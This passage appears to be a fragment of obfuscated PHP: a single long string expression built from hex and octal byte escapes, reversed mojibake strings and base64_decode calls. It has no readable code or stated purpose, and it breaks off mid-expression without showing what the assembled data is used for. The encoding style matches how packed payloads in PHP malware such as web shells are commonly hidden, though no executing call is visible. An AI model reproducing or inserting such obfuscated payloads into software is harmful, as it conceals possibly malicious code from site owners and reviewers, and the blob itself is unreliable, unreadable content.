bf\xb1\xba\x6b\x97\x2d\x3b\xef\xf8\xca\x29\x4b\x7c\xf\x1c\xb3\x3d\xb5\xa5\xad\xe7\x93\xdd\x67\x9c\xf4\xcc\x93\xda\x9b"."\xff\x2e\xbe\xf0\x96\x65\x7\x5d\xf9\x56\xc9\xbe\x25\x9f\xae\xb8\xe1\x83\x2f\x3f\x88\x6e\xde\x76\xfd\xcb\x87\x3e\x34\xd1\xfb\xd0\x1f\x9f\x3d\xf0\x20\xd5\xf5\xf1\x27\x31\xf3\xd6\xa3\xf\x5f"."\xe1\x2f\x4d\x3d\x34\x73\xe7\x95\xa3\x2e\xf8\xea\xef\xae\xa5\x8e\xfb\xde\xb8\xff\xd6\x4c\xfd\x89\xf1\xa7\x2e\x6b\xf1\x75\xbe\x10\x7b\xee\x91\xe0\xdb\xa5\xd7\x3a\xc7\xff\xfe\x3\xb9\xef\xc6".strrev('ê½{OËúëyO+’¡ù¶Ü?¾v#‰êst6OŞñynW÷¦Âò™üß¶‹e‚ó¸Ï')."\205\146\337\206\35\57\76\367\355\37\343\35\47\254\332\322\167\305\332\347\326\254\53\37\70\342\202\351\17\236\170\302\246\7\77\174\165\314\306\125\341\255\5\123\324\202\312"."\247\357\323\257\336\135\137\125\136\133\72\336\171\343\11\133\246\255\330\62\55\221\36\76\356\201\351\173\377\365\227\367\132\323\43\56\276\375\360\257\26\254\334\162\346\177\372"."\x77\x3e\x97\xa8\x78\x6b\x4d\xec\x90\x3e\x65\xd4\xdc\xb1\x13\x8b\xe2\xd7\xcf\x4f\x95\xcc\xbb\xbf\xe3\xae\x55\x7\xbf\x2e\x9f\x77\xc9\xe0\x4b\xef\x7b\xca\x36\xdd\xe7\xd\x1e\xf3\xcc\xb5\x4d".strrev('©®¶#Q’åh~©iÎ35íÅÿ7_f†O%İ|™ç>w‡ôcş-‡â ûìï%ÒñN;')."\xf8\xf7\x73\xc9\x8c\xff\x8e\xe9\x7\xdf\x9b\x1c\xf9\xf8\x57\x27\xfe\x77\xf3\xa3\xa7\xf6\xdc\x71\xf6\x9\xaf\xfd\xcf\x95\xe5\xbd\xdd\x33\x37\x1d\x70\xd7\xb6\xca\x9a\x8d\xca\xcc\xc7\x57\x7".base64_decode('C2OOV75YetzQ/RvnvPzAOcc+3/x+889L/nD9KYvXLr3jiLPumthsFtz9xAnvbOs=')."\155\375\115\343\35\137\57\111\377\346\373\75\323\216\275\175\365\227\117\106\233\346\25\257\317\276\365\356\333\73\66\356\233\163\334\264\71\207\50\322\221\233\267\376\371\340\223"."\x7f\xb3\xe2\xba\x98\x3c\x7b\x4c\xa7\xb7\xc7\xbb\xb3\xe5\xb8\xe7\xd6\x1c\xff\xdc\x15\x77\xbe\xb2\xac\xfd\xf5\xec\x5d\xdf\x1f\xe4\x38\xeb\xda\xa9\xa7\x4e\x6e\x19\x3e\xed\xd5\x53\xc6\x2e\x3c".base64_decode('6LStz166Z7Lv1use+Hz5Y1/5tPLfPrP92ar+yU9/233/qKFXPvl27MYjEwukt3Y=')."\157\357\315\114\272\151\303\340\312\51\13\77\333\264\351\235\322\245\123\16\170\142\313\244\13\357\333\372\374\201\363\126\315\131\170\340\336\157\347\137\131\122\162\333\201\147\310"."\337\177\71\356\333\312\355\73\132\56\367\376\163\356\332\343\213\266\264\337\365\346\200\147\371\327\167\135\360\261\322\131\167\112\321\370\123\46\77\372\273\244\167\312\273\315\133"."\376\121\372\346\360\326\366\247\377\356\334\354\337\366\366\145\263\32\127\276\166\100\163\127\373\214\266\37\167\315\276\362\233\215\327\204\233\357\16\367\76\374\360\103\221\167\206"."\117\335\274\146\267\253\247\362\236\222\236\253\357\177\343\241\255\263\66\236\264\246\324\153\126\177\277\143\105\374\334\37\366\355\210\237\273\161\370\273\27\167\335\362\356\276\157".base64_decode('bl++/uZpiz/7eO/sk2/54cMP3l5+y+LvrtkamPb4Dz+6J2w+7/53/f3Dn/zt0oU=')."\x1f\x15\xce\x8d\x6e\x2d\x3e\x5a\x9f\xd5\x54\xbf\x69\xd3\xdb\x67\x4\x47\x56\xfe\x36\xf5\xe9\xfd\xff\x9d\xf3\x9f\x82\x49\x63\xe\x7e\xb5\xfe\xe5\x4f\xb2\xde\xb5\x7b\xce\x1e\x75\xcb\xe6\xed"."\x97\x8c\x29\xfc\xd3\x25\xff\xf3\x6f\xf7\x59\xaf\x9c\xfb\xde\x41\x5\x8b\x2e\xd8\x35\xfa\xe5\x57\x36\xc\x2f\x39\xed\xaa\xa3\x7a\x1e\xe8\x99\x58\xe5\x1b\xd9\xd4\x59\x3f\x34\x30\xee\x9d\x55"."\x37\xc\xc7\xeb\x22\xd\xa5\xc7\x7c\x7c\xfd\x47\x93\x6\x3e\xfb\xfd\x3b\x15\x7d\xbf\xb9\xea\xa2\x1f\x3d\x57\x2e\x3f\xe2\x14\xef\x7d\x7f\x7d\xe6\xfa\xbf\xfd\xed\x9\xd7\xd2\xd1\x37\x5f\x59"."\336\277\361\231\326\301\317\325\357\276\172\341\257\367\264\277\265\374\341\310\243\316\207\317\316\164\337\65\157\350\211\7\27\177\377\323\71\347\276\231\332\373\346\336\271\347\70"."\137\372\52\166\360\35\216\73\227\156\330\64\312\135\333\333\267\42\175\304\312\276\252\343\43\67\57\56\161\147\6\227\64\75\175\360\145\57\64\227\135\333\355\276\45\370\101".base64_decode('tmvG+etvvOT6uo+Hjp178NLR/yyKf/x6TfmJ1x102bgTBzfGH77iT39ddOrTQ/4=')."\xb7\xfe\x73\xe7\x34\xdd\xa3\xdd\x3b\xc2\x73\x5c\x73\xec\x37\x77\x5c\x55\xb3\xf6\xfa\x23\xaf\x38\x79\xa5\x63\x7e\xf9\xd8\x6b\xbd\xd\x85\x37\x8f\xe8\x7a\xde\x34\xcf\x78\x7e\xe0\xfd\xee\xcd".strrev('¬i½$ØïŸÜá¼]68ä½'."\r".'éc¸-¬Ô=¥?Ï¿Í/±èæx?f—oÇbÉP¯wÅ').strrev('¯e×ı-@»ï_{Én÷ŞOíÎöÛà¾ï>/šºt'."\r".'®¶ó§åL}>Ìg£ºàça¸')."\xbd\xf2\x62\xe2\xe7\x27\x66\x3e\xb8\x52\x31\x26\x9c\x91\xdd\xfc\xe3\x95\x6f\x15\xfe\x6d\xcc\xcf\x7f\xd9\xa4\xff\x65\xde\xba\x57\xb7\x3e\x97\xd6\xc6\x4e\xd9\x78\xce\x35\xef\xfd\xf5\xbe\xf9"."\367\175\373\155\317\343\47\274\175\313\145\347\375\274\347\316\337\134\146\166\136\71\272\264\376\337\167\174\366\126\373\332\164\344\200\63\106\315\130\166\366\370\371\337\227\77\356".strrev('õ\\—EõttıÎú£ÁŞf}ö#“v7ÛÓqœË+ášêm}Ş?Çr³qSŞâ<')."\xd3\x9e\x93\x66\x7c\x71\x74\x6b\xd1\x7d\x7f\xbf\x29\x64\x2e\x99\xba\xa3\xf2\x77\x4f\xce\x59\xf0\xb7\x67\xbe\xfb\xe6\x9e\xe9\x17\x2f\xf8\xdb\x9e\xcd\xa7\x76\xae\xd\x5c\xdb\xb6\xef\xee\xcc"."\xdf\x1f\xfd\xdb\xef\x5f\x53\xeb\xce\x8\xdd\x70\x61\xf8\x35\xef\xdc\x79\x1b\xc6\x3f\x7a\xf8\x96\xce\x55\xcf\x97\xaf\xfb\x38\xf8\x7e\xc7\x98\x2d\xef\xbc\x7e\xec\xa9\xeb\x3f\xc\x39\xb5\x27".base64_decode('t3avP2TvfU90THmxe0TwTU/FzgfGlz3w191vPvDWgS/deNrtw9ed1Hbnp/Pvrg0=')."\135\356\176\376\345\143\116\36\73\345\235\42\343\262\235\115\243\156\270\344\243\325\257\75\135\72\363\250\353\276\151\230\272\372\224\275\147\116\352\333\166\314\356\207\6\337\170"."\xf4\xa7\xcc\xf9\xaf\xdd\x38\xf6\xc3\x3d\x23\xb7\xef\x9a\x78\x6d\xd7\xca\xbd\x95\xfe\xd2\x8b\x6b\x8f\xf\x6e\x69\x18\xfd\x1f\xff\xfa\x2d\xa5\xd1\xf8\xa6\x92\x25\x8f\x96\xac\x3b\xb2\xec\xf0"."\303\72\313\335\141\365\240\75\322\325\363\236\356\233\372\202\157\352\143\203\317\155\131\51\205\266\51\153\157\333\376\130\317\333\337\74\370\312\117\13\276\336\234\336\273\350\323"."\207\317\74\364\57\307\125\117\176\343\272\247\146\352\75\115\345\247\27\176\377\375\147\267\217\231\373\340\352\177\236\376\365\65\313\222\27\126\215\72\161\153\137\335\302\304\347"."\x1f\x7f\x62\x1c\x70\xee\x19\x47\x6\xb3\x9f\x9f\xf3\xf0\xbb\x3d\xef\xbc\x73\xce\xf\xa7\x9c\x52\x77\xe9\xb9\x73\x8f\x7c\xfd\x98\xd9\xf3\xf\x7b\xfd\x98\x89\x5f\x7c\x3e\x54\xbf\x4a\xa\x8d"."\x50\xe\x8f\x97\x1c\x7f\x72\x6c\xdd\x71\xa9\x9b\x1b\xaf\x7c\xf7\xb8\x9a\xfe\xaf\x16\xae\xfc\x61\xfb\xd9\x93\xe7\x5c\x33\xb4\xf0\xaf\x8f\xdf\x56\xfd\xc2\xa1\x9b\xaf\x7d\xe9\xfc\x37\xcb\xe".base64_decode('+2ri1fX/OujAqeqy26bOfuac6XdvPqbsgvU7Trz7iw1fuOYcd+QVhe//94OVWx8=').strrev('¿çâxíŞ[Ëø¼_?“šêû¾§š´7ãï½RŞïËßfZaúîªÃ=Ç¾ây')."\354\372\76\160\363\217\357\337\362\356\71\77\274\377\354\12\367\250\67\315\257\137\154\274\346\347\357\306\176\367\375\356\300\65\267\54\326\367\275\377\370\311\117\375\364\366\263"."\x87\x7f\xde\x79\xce\x8f\xf\xdf\xe3\x9e\xf6\xe3\xe7\x4f\xd5\x4\x2e\x39\xf1\x8b\xc2\xad\xd7\xdc\xfe\x78\xf2\x95\xc1\x9b\x66\x6e\x3b\x72\x46\xa3\x7c\xc5\xec\x17\xdb\x7\xb4\x8d\x47\xdc\xdc"."\xfd\xed\x9b\xff\xdc\xb1\xe7\xd9\xd7\xf6\x1d\x77\x49\xd1\x6b\x9f\xdd\xd4\xf2\xf0\x6b\xef\xbe\x7d\xfa\xa7\xef\x9e\x75\xe6\x19\xcb\x96\x6d\x5e\xb1\xf7\xd3\xff\xee\xfc\xcb\xa6\x89\x67\x8e\xf4".strrev('õ}< ?..s°æ³ÿO×ı¿“—ÆŞc´×^<_\'Öqx/É'."\r".'Ğãÿ¿ÄÚw¸î')."\x73\x5f\x6d\x18\x7c\xf1\xa4\xc0\x1\x1b\xce\x99\xbb\xe4\x48\xed\x80\xb9\x33\x6f\x5d\xd3\xb9\x71\x96\xb3\xd7\x79\xce\x3d\x73\x4a\x77\x8c\x3c\x7a\xdf\x88\xdb\xcc\x91\x9f\x38\x36\x2b\x33\x56".base64_decode('HTrp7lHvPHr1Ez8Uj33t4+nZuptvur//7BP/e9a8UW1nNJxK756UEwM3YjpVWU4=').base64_decode('TOnjQ91pOUb1W1oqOjBIJOyublPuV4jyp7JiMpH31PhwNENMBzO9cv+QQeSGCvw=')."\223\226\373\143\232\101\304\215\156\243\313\114\306\211\242\145\302\144\122\147\131\5\341\302\123\161\171\310\350\42\307\273\223\313\111\11\135\375\303\231\250\331\103\62\115\304\277"."\343\53\111\36\242\307\257\230\104\116\326\143\275\335\372\160\226\250\375\46\125\20\350\204\122\322\121\271\277\117\213\16\20\245\151\267\334\37\217\46\207\111\211\23\111\121\343".base64_decode('aVEVEyaQpkwgo0UaPJEmHRqMJ2K9ZEwmTSB1JNNDsV6qPpg0maSdMInkNnsGgdg=')."\x45\x2d\x91\xfa\xd\x53\x19\x20\xc2\x48\x79\x5\xa9\x70\xa8\x3f\xda\x93\x49\xe\x52\xd9\xb8\x3f\x9b\xa4\x56\x92\x13\x4a\x49\x71\x95\xa4\x32\xb5\xd7\xe8\xcb\x44\x87\x69\x65\x13\xe8\x7\xe9".strrev('eyNLœtŞÍ†W‘’õŒ™º!+HŸ\'²’Œ5>ä'."\r".'¬GÕ,dõ›iË¢tI¤Ã').base64_decode('TUrmYQL5HV9GClETxlAqS6RLbWBISdNWZjR9QBkmaJXoG+7P6AQlMtlYckAmozE=').base64_decode('uYLUoQ/3DGb6ifpiMJPs0fqI4nr8hMl0oknHu5ID+lCMRKeUvqGsRgIVZaSFFRU=')."\343\251\256\242\257\167\50\111\252\256\50\45\265\225\123\274\33\312\14\16\350\175\104\217\120\76\211\164\53\63\30\113\364\165\221\43\203\204\32\123\122\124\42\116\47\272\122".base64_decode('WpwuhaEuVY+ZFH9IIRPIrGhRM9GbIfM7eXw5nTQypxMpzsjDaT3bTbA1KvdmB7s=')."\14\132\24\51\263\222\142\353\204\162\222\273\254\234\14\112\45\305\225\256\376\144\72\332\235\241\123\107\13\127\62\246\321\117\372\247\200\121\353\116\23\254\60\207\373\172\172".base64_decode('u0lN40lp6d5ovL+PACeQIUykewcG+whSTBxfRtfVcFJN99DukfHsH1Tl1ECWrl8=').strrev('ufZœLŒ4ŒF]²¦ŠÇª.™jNŒ‹HeMºŠN“Ú°æZ2è’\'“c‚').strrev('%%^Z-™6\\Á“v)K	‚’—¢TñİE2nÑÈ¡#“\'“2RŠÊ.‡¬Ô2%').strrev('9Z¥Ò)¹¢Á$á©Ò{{>då:xÆL›ši¢e'."\r".'©úQ&Ê“8%_é/f=êt)t')."\xda\x4b\x95\xe6\x86\x29\x9b\x94\xc0\xb1\x4\xec\x4a\x53\xda\x95\x92\xd3\xcc\xfc\xa8\x89\x4c\x4d\x54\xb4\x75\x17\x13\xf4\x2a\xa\xb5\xbf\xa6\x76\xdd\xdc\xbe\xc5\xc8\xa2\x9b\x22\x4\xae\xa6"."\24\256\375\217\165\161\75\13\124\133\11\126\61\60\30\22\163\106\323\246\20\15\102\226\330\220\251\351\314\16\7\133\370\271\140\253\134\326\176\122\72\223\347\10\230\150\323"."\xd\x63\x40\xd3\xc9\x70\xf4\x6a\xb1\x68\x52\xcb\xc6\x2c\xa5\xc6\xba\x2c\x65\x32\x28\x55\x2f\xd9\x63\xba\xf7\x3\x7\xe5\xf0\xd3\x7a\x1\x66\x19\xa0\x2e\x34\x63\xcc\x3e\xb\xfe\x21\xcd\xc5".strrev('¶xÜ";{›Âk/Yt™34j±Šv—^”Âœøİ0—AÎ‹µ8#K°«/¥ò—')."\xb3\x4d\xb0\xbe\x82\x61\x41\xa5\x2c\x74\x88\x4f\x9a\x30\x82\xe2\xdc\x59\x3b\x4f\x4f\xde\xf6\xac\x7f\x7c\xd7\xf2\xab\x77\x5f\x75\xef\xee\xcb\xd7\xed\x7a\x6c\xc5\x9e\x75\xf7\xee\xda\x78\x15".base64_decode('CO58ZNmudTfvve6inY9cvvOR3++5+IHPn7hs1/L1ey7YuOvG1btWXbzz8Y17nro=').base64_decode('+KPVS3c+snb3jX/YddFDOx+/etclt+66ePnuFZfv3HgjSL/7El4ySLZr7bUw7xM=').strrev('¡{D¡4Rt0&µ%ÃI¦”„!µZ’xLTi—„!q?Ÿ±f­·=‘äzïç')."\11\234\231\120\164\311\104\246\160\62\370\227\326\322\116\214\152\370\306\251\41\251\151\30\55\321\101\167\321\225\41\230\47\147\142\32\203\306\14\313\35\133\102\76\122\103\60"."\50\174\63\244\16\53\251\14\104\115\62\326\156\174\155\215\333\332\133\361\67\337\144\341\210\74\150\11\147\214\43\104\21\374\44\247\240\120\313\53\165\313\0\20\253\222\272".strrev('£àdnİ ?1"“qNŠhÖ%EåÉm¤yOpãT£Q»Ãst~L‘NŞ‰6A')."\66\16\20\327\260\225\0\131\126\267\225\164\211\121\326\161\43\152\173\144\10\342\220\160\123\34\22\72\367\227\254\27\66\241\141\7\65\226\20\27\254\330\174\135\311\44\345"."\x28\x6b\x7a\x66\x28\xef\x90\x8b\xad\x11\x8d\xe\x6c\x5d\xb\xe5\x19\x46\xd6\x39\x4b\x24\x98\x99\xac\x99\x27\xa1\x38\xda\x96\x43\x78\xad\x2e\x9\xc8\x2a\x3f\x7a\x46\xa6\x19\xbc\x1b\x38\xc8"."\x8f\x27\x40\x45\x8c\x2a\xeb\x4a\x4c\xa5\xe6\xe2\x4a\xa\xa5\x24\xd4\x18\x5f\xb8\x61\x76\xea\x51\xb0\xec\x74\xcb\xd9\x66\x44\xee\x26\x57\xd8\x7c\x69\x11\xc2\xc7\x38\x12\x57\xcc\x8\xd9\xd3"."\110\45\265\236\220\257\56\322\352\241\167\35\344\114\306\155\304\172\15\67\64\114\124\373\25\277\332\345\206\167\103\41\136\272\272\250\315\7\132\354\21\271\113\323\115\332\274"."\54\274\262\102\230\323\251\65\231\104\6\336\315\67\247\324\220\13\302\344\364\70\42\214\0\371\346\127\231\104\150\322\176\162\313\310\105\175\255\160\211\36\46\43\71\270\125".base64_decode('AYB5IbnaH7yeWeUAOhaPK4ZZha7nSeMk0JaJrgrwgZZnpWsi+ERTQqhUR5rXy/o=')."\xd\xbe\x83\xd9\x34\xc4\x86\x2a\xa1\x55\x94\x71\x74\xf1\xb4\xf2\x38\x1e\xaf\xc4\x46\x92\x91\x11\xfa\x30\x40\x12\xd0\xbc\xcd\x56\x14\x0\xad\x73\x32\xac\x0\xe3\xb\xe6\x31\x66\x20\x4b\x63"."\102\76\110\221\206\160\265\70\310\21\12\146\107\235\371\205\254\246\70\346\31\200\53\151\146\142\154\44\145\172\70\155\0\4\122\323\12\103\305\254\41\336\271\120\370\312\206".base64_decode('xvkRwFLQvRUgcSSmkqR+X22k3hcU8DOTteOn6NTB0+qLhEIBAVurBNIPL9BxcwU=')."\x18\xe2\x17\xe9\xe0\x79\x9d\x68\x3d\x28\xf2\x3c\xf0\xd2\x3d\xbc\xde\x10\x92\x88\x6d\x2d\x40\xb0\xba\x26\x4f\x90\x5d\x61\xa8\x74\x95\xba\xca\x78\x5a\x50\x61\x4\xde\xe4\xa8\xa6\xb7\x78\x43"."\x61\x4f\x30\x8f\x3\x6\xec\x98\x81\x4c\x2\x71\xc6\x40\x32\x34\x5\x66\x4b\x75\x1\x7f\x5b\x73\x4b\x8\x7b\x1c\xc0\xf0\x96\x80\x10\x8f\xc\xd5\x49\x34\x75\xcf\x90\x1b\x4d\x8a\xf7\xb6\xfa".strrev('¢’‚Âí¶‚$¬‰bR{Ä’ã˜Pİ0±'."\n".'AİtÌ(›Ğ×É^u=')."\xe2\x5\xae\xe\xa3\xd3\x2d\x4e\x89\x6a\x27\x49\x38\xdc\x5a\x4f\xba\x58\xc5\xbe\xd8\xf6\xde\x1c\xa\xcd\x24\xd7\xed\x2\x41\x4f\x9d\x9f\x36\x7\x50\x28\xf2\x19\xa8\xf3\xe1\x8f\x8f\x56\x6e".strrev('Sãs¼?Ö{HÉÂ2û¿\\¯vË“Ñö]ÖˆäÜkîş_v‚ƒ—ë·Xn²ØùØ')."\37\255\134\275\153\335\265\273\257\176\364\243\353\57\304\21\173\357\332\260\353\322\325\254\141\322\336\25\117\356\136\166\7\343\222\60\163\344\0\271\367\136\164\371\107\33\327".base64_decode('QR7p9t/vfnDp7hsv33XpbbuuW/3RsvW7/nTBriWX71l/1Ug7MuFwO50OYsLint8=').base64_decode('YZQU4SHuMMbB4S0Gv0Xwcgv4pTb6yIx7Zpu3pc5rvywmBonnihKMJdgoifDHBvE=')."\x7c\x41\xc3\x11\x74\x3f\xb0\x70\xbf\xad\x58\x44\x70\x40\x68\x94\xd0\x98\x7a\x6f\xa8\x2e\xe8\xab\xf5\x92\xeb\x13\x6c\xa2\xc6\x20\x96\x8e\x58\xc2\x0\x68\x28\x38\x8b\x7d\xb3\x1b\x93\x39\xfe"."\106\244\42\212\320\305\222\245\43\262\53\252\45\263\251\64\152\254\124\0\215\353\12\34\220\360\43\326\120\52\200\133\50\0\50\121\260\374\212\240\377\1\144\236\135\70\267"."\320\121\352\50\53\226\210\63\22\234\203\70\37\221\12\210\25\77\313\147\251\304\321\145\11\225\71\112\213\245\202\114\157\1\151\27\37\127\320\372\10\116\151\110\262\243\210".strrev('FÄµ¤‡ìJkz–I‡aHÏ.¢E-~Ë0u˜ˆ'."\n".'²êa–hO.lX4')."\x5d\x78\x7c\xc5\x69\x2e\x2c\x96\xba\xc8\xa5\x94\x3c\x91\x28\x9b\x65\x30\xaa\x2d\x83\x51\x34\x8e\xd0\x8a\xd6\x46\x36\xdf\xf8\xc6\x89\x84\x2f\x24\xe2\x66\xc9\x6\x9d\x28\x2\x45\x53\x5\xa1"."\170\266\150\132\15\164\3\114\16\116\17\76\130\14\274\233\301\112\2\44\211\105\320\31\204\160\66\211\171\342\220\203\230\2\314\2\342\176\246\214\70\45\167\304\61\111\363"."\x5c\xd6\x7\x8a\xcb\x12\x65\xf\x98\x7b\x19\x78\xb5\xd2\x1b\xae\x6b\xc2\x58\x1e\x12\xd0\x3c\xd6\x35\xc6\x82\xa8\x7c\x38\x25\xb\x8a\x30\xa9\x83\xa4\xc3\xcb\x5\x12\x84\x23\x51\x3a\x5f\x4b".strrev(''."\n".'<	ˆ«¬ª0²T~hT|¤!RÕHŞÈzpä!Í¼šê†¯ŒØ C').base64_decode('mThpDJl9CV00l1GW6kLst4EUybwhBYLhCBgAQp4Fqlso7BiCDT+8GddPBYBuOWo=').base64_decode('atRdRayLOk0ChcMy6wItDT56e7K+yxJXH/RBXwGkWomWEOEWNiCQGYixb35PHkY=')."\xb0\x1d\x1e\x4\xf8\x6\xf\x63\x4\xdf\x4d\xb0\x9a\x50\xb\xfb\xe6\xdc\x23\x8\x40\xb\x4f\x4e\x5b\x67\xd7\xb3\xef\x26\x76\xb1\x19\x46\x4\x82\x42\xc0\x13\xf4\x34\x87\x58\x30\x38\x9b\x5d"."\271\141\60\174\365\46\322\322\326\314\351\271\337\63\13\240\102\200\263\40\224\26\27\271\112\152\212\73\360\365\105\374\211\177\246\323\20\274\322\325\271\260\314\41\115\130\134"."\x4c\xd2\xd0\xb\x7f\x11\x33\x1\xb8\xee\x8\xaf\x65\xa6\x3f\xe2\xf\x34\xe2\x30\xf2\x29\xe5\x4d\xc7\xb8\xa8\x21\xb5\x4b\x80\x53\xd\x73\x4e\xd5\xa0\x1b\x13\xc3\x75\x9\x60\xa8\x84\xef\x44"."\113\55\201\331\36\356\240\110\210\300\20\162\25\133\342\156\213\334\363\333\73\6\72\134\200\53\60\26\360\133\211\365\265\22\345\67\352\220\226\0\53\23\110\156\17\335\53"."\27\70\310\266\20\111\152\161\352\130\4\120\75\312\23\340\337\71\364\3\21\104\222\1\210\261\231\44\275\236\210\357\105\106\72\26\165\214\355\160\272\360\125\120\310\245\164"."\70\170\223\42\336\71\140\43\15\205\54\367\130\43\310\345\16\51\35\164\226\174\341\245\211\3\123\311\17\221\152\246\222\41\40\301\151\325\154\116\275\63\27\265\200\177\215"."\xe1\x45\x5e\xf0\xcf\xf\x7e\xfc\x61\x30\x6b\x2a\x4b\x0\xd6\x9d\xdf\x37\xc3\xbb\x8\xfe\xc7\x23\x8a\xd9\x40\xe2\xb\x60\xd6\xc\xbe\x96\x45\xe0\x7f\x40\x45\x16\xf9\x5a\xec\x85\xd5\x7a\xc3"."\263\275\136\234\200\176\223\137\236\24\120\25\322\125\301\365\30\274\221\101\242\371\15\15\122\164\44\122\204\6\323\331\71\256\70\22\161\33\155\4\155\230\357\210\242\302\321"."\x65\x85\x64\xa3\xf0\x84\xea\x38\x89\xb5\x20\x44\x2e\x2e\xa0\xfb\x13\x56\x44\x60\xae\xb4\x48\xb8\x31\x18\x68\x6b\x15\xc2\x4d\x9e\x59\xbe\x96\x46\x1a\x72\x97\xd0\xaf\x12\xea\xd2\xa7\xde\x17"."\x2\x43\x54\x47\x91\x91\x7b\xf8\x12\xc3\x84\xab\x44\xbc\x8f\xc8\xde\x5a\x30\xbb\x1e\x90\x6f\x10\x10\x78\x73\xc8\xf5\x63\xf2\x6b\x5d\x6c\xb5\x6d\x3e\x7f\xbd\x78\x75\x1f\x26\x24\xbb\x6\x22"."\xdd\x64\xe3\x18\x43\x1b\x47\xc3\xe8\x12\x3f\xd\xc0\x21\xa7\xdf\x8\xdd\x68\x0\x8d\x1\xd\xe0\x1\xa0\x21\x34\x5c\x34\x80\x3c\x89\xd1\x0\xea\x28\xd\x40\x31\xc4\xdb\x42\xe3\x80\xf0\x7"."\4\67\52\321\45\344\176\166\367\164\112\254\113\160\41\1\311\257\13\153\316\240\173\21\40\220\311\114\351\152\323\235\42\315\223\40\157\143\103\114\111\270\2\17\225\260\202"."\266\310\215\123\0\16\23\245\1\277\35\13\152\20\7\274\200\342\51\276\166\155\206\125\63\151\251\224\134\317\4\225\372\320\235\130\241\132\262\207\163\45\22\126\72\106\64".base64_decode('QeWNleBEH8zVM1bRiJGhBUziIa4qHORX592yWuxCCJn8Y/BPB0lL9QbkjlKhg+w=')."\252\276\100\304\17\366\212\210\50\70\372\2\104\331\340\352\22\175\35\104\270\313\4\227\314\255\124\115\75\53\270\41\103\26\253\140\32\75\374\146\64\323\177\240\270\154\27".base64_decode('TCyMm6pVQU0ahOLlSDgmCKQeErB7Nrs5qQjmFqlM9UcNYVWTHtqSDKISXY6RfLA=')."\x14\x89\xd6\x8c\x74\x92\x69\xab\xf\x31\x80\x12\xc9\x8\xf4\x26\x0\xb8\x9c\x88\xc2\xdb\x9f\x52\xc\x83\x9d\x83\xa0\x5d\x9f\x7e\x9a\x9\x7e\x95\x5b\x74\x95\x56\x5f\x4b\xc7\x2a\x9b\x36\x43".base64_decode('Cj00qu9Ctrz8zgwbOEOw8UVqPj7e2IudLSMpycc6LqTiQD93igb1WrzMTsqZ8k4=')."\16\253\31\273\226\53\255\265\52\172\112\105\252\303\331\374\2\1\213\27\162\243\33\31\332\57\15\156\66\15\152\150\145\63\353\54\243\211\251\53\114\204\60\22\343\317\230"."\x55\x3c\x98\x52\x94\x57\x30\x9b\x46\x54\x83\x14\xab\x93\x83\x83\x91\xb6\xc6\x99\x9a\xd6\x2c\xa7\x87\xc2\xda\x2c\x55\x21\x68\x5a\x1f\x98\xdd\xe2\xf\x50\x5f\x4f\xd4\x11\x1c\xe\xc5\xc9\x1"."\43\220\161\164\27\15\230\364\103\227\111\315\263\351\76\6\225\16\202\173\320\221\42\16\240\311\344\70\351\11\326\65\1\16\64\322\340\3\214\267\167\116\230\27\320\4\262"."\x2\x9e\x56\x98\x26\x1\xda\x4c\x1d\xa0\x0\x82\xa\x89\x98\x5f\x8b\xb3\xc5\xb\x88\x14\x71\xfc\x63\x59\xc0\xbe\x0\xc9\xeb\x52\xe0\x5\x8\x6c\x84\xe\x2f\xa9\xb0\x8c\xd8\xc5\xcd\xaf\x67"."\152\23\174\350\355\147\155\346\315\127\107\22\262\12\165\44\105\374\172\205\101\205\363\326\40\33\272\157\362\253\231\270\67\107\124\23\312\44\320\55\133\36\204\100\330\132\236".strrev('ECDíuH)„˜Gwº7Qªl¦­Y4¡l#}Ò\\à¤l	¡¡X€%sD‚uÌ')."\x85\x80\x4\xb2\x2f\x7a\xdc\x48\xfc\xe9\x70\xa5\xbd\x7\xff\xcc\x4d\xc5\x9c\xa0\xe1\xe4\x18\x31\xa6\x98\xcc\x8f\x9\x5c\x65\x1e\x32\xfc\xb0\xcd\xc2\xad\xc5\x14\x23\x50\x3\x82\xab\x31\xb9"."\x5f\x81\xd7\x4b\x28\x27\x9e\x73\x40\x4b\xba\x92\xdb\x39\xe6\xb8\xc6\x7a\xb0\x35\x23\x50\x1f\x9\x5\xda\x82\x54\x91\x7\xc3\xe8\x2\x5b\xd0\x5b\x37\x97\xe9\xd3\x18\xb4\xc1\x33\xcb\xe\x81"."\153\40\354\151\314\13\146\102\23\204\43\266\44\22\14\100\331\321\353\157\260\145\10\65\61\257\157\126\130\304\357\153\231\221\67\42\34\210\64\13\131\60\320\27\366\66\333"."\141\326\22\102\136\270\176\171\270\326\37\250\23\242\175\201\334\221\0\274\220\15\210\105\120\14\4\274\164\307\102\304\213\124\1\226\44\266\10\162\257\316\10\140\176\153\72"."\26\27\27\165\270\153\134\45\114\366\302\364\104\270\352\266\37\260\101\351\176\225\35\0\267\14\12\304\331\110\310\355\162\221\112\330\7\220\16\231\363\34\112\106\211\253\315"."\20\166\63\142\151\205\355\332\76\275\20\353\262\173\246\363\141\165\172\44\64\67\304\106\33\243\142\276\170\13\176\341\144\342\301\227\55\61\370\327\52\46\205\47\263\171\23".base64_decode('WhDUcmFQBLlUja8FvmhjWjQLPZnwEefbDAC5+BZL1x1TE5BNxik6JYVjKnILsS4=').strrev('³(Ù2”r·k…S-QfçÕP51Ö­ô#p±œ¦uÌ^œ°8WØK´ü'."\0".'AÛ')."\210\103\44\313\160\16\250\164\10\106\63\77\50\344\104\70\42\43\227\77\21\321\366\242\317\151\250\361\264\123\116\306\65\300\44\44\122\24\52\367\132\342\271\243\275\214\226"."\x54\xa9\xbf\xa3\x3e\x27\xa8\x42\x88\xc3\x89\x41\xe1\x94\xf0\xc3\xe3\x1d\xe6\xa4\x10\x6\xc\x16\x12\xf1\x2\x91\x46\x76\x70\x9\x9\x70\x93\xd\xd\x19\x90\xb9\x50\xc\xa1\x4e\x54\x49\x15".strrev('´;/TÓÃòõHÑ(¸×ë(™ù'."\n".'˜eî$:&È÷î~G§©™